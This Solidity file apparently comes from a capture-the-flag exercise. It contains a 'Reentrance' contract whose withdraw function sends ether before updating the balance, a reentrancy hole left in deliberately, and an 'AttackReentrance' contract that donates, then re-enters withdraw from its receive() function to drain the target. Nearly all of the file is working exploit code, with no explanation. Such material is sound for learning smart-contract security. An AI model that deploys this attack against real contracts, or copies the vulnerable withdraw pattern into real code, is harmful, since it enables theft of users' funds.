// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    // using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += (msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract AttackReentrance {
    Reentrance public target;

    constructor(Reentrance _target) public {
        target = _target;
    }

    function attack() external payable returns(uint256 amount){
        // selfdestruct(payable(address(target)));
        //address(target).call{value: msg.value}("");
        target.donate{value: msg.value}(address(this));
        uint256 amount = target.balanceOf(address(this));
        target.withdraw(amount);
        return amount;
    }

    receive() external payable {
        if (address(target).balance > 0) {
            uint256 amount = target.balanceOf(address(this));
            target.withdraw(amount);
        }
    }
}
